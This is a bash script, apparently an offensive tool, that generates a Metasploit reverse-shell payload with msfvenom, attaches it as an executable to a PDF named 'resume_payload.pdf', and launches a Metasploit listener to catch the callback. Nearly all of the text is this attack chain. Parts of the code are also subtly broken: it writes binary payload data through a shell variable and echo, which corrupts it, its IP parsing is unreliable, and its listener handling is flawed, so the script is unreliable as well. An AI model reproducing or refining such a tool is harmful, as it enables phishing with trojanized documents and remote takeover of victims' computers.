#!/bin/bash

# Validate user input
if [[ $# -eq 0 ]] || [[ $# -gt 1 ]]; then
    echo "Usage: $0 <PDF file>"
    exit 1
fi

if [ ! -f "$1" ]; then
    echo "Error: File not found: $1"
    exit 1
fi

# Set the target IP address and port number
LHOST="$(ip route get 1 | awk '{print $NF;exit}')"
LPORT=$(shuf -i 2000-65000 -n 1)

# Check if pdftk is installed
if ! command -v pdftk &> /dev/null; then
    echo "Error: pdftk could not be found. Please install pdftk before running this script." >&2
    exit 1
fi

# Check if msfvenom is installed
if ! command -v msfvenom &> /dev/null; then
    echo "Error: msfvenom could not be found. Please install Metasploit Framework before running this script." >&2
    exit 1
fi

# Get the payload options from the user
echo "Enter payload options:"
read -p "Payload type (e.g. windows/meterpreter/reverse_tcp): " PAYLOAD_TYPE
read -p "Payload architecture (e.g. x86): " PAYLOAD_ARCH
read -p "Payload platform (e.g. windows): " PAYLOAD_PLATFORM

# Generate the payload with msfvenom
PAYLOAD=$(msfvenom -p "$PAYLOAD_TYPE" LHOST="$LHOST" LPORT="$LPORT" -f exe --arch "$PAYLOAD_ARCH" --platform "$PAYLOAD_PLATFORM")

# Create a temporary directory for the files
WORKDIR=$(mktemp -d)

# Check if the temporary directory was created successfully
if [ ! -d "$WORKDIR" ]; then
    echo "Error: Could not create temporary directory." >&2
    exit 1
fi

# Create the executable file with the generated payload
if ! echo -n "$PAYLOAD" > "$WORKDIR/payload.exe"; then
    echo "Error: Could not create payload file." >&2
    rm -rf "$WORKDIR"
    exit 1
fi

# Inject the executable file into the PDF using pdftk
if ! pdftk "$1" attach_files "$WORKDIR/payload.exe" to_page 1 output "$WORKDIR/resume_payload.pdf"; then
    echo "Error: Could not inject payload into PDF file." >&2
    rm -rf "$WORKDIR"
    exit 1
fi

# Start the Metasploit listener in the background
if ! msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit -j" &> /dev/null; then
    echo "Error: Could not start Metasploit listener." >&2
    rm -rf "$WORKDIR"
    exit 1
fi

# Open the PDF file with the injected payload
if ! xdg-open "$WORKDIR/resume_payload.pdf"; then
    echo "Error: Could not open PDF file." >&2
    rm -rf "$WORKDIR"
    exit 1
fi

# Clean up the temporary directory
if ! rm -rf "$WORKDIR"; then
    echo "Error: Could not clean up temporary files." >&2
    exit 1
fi
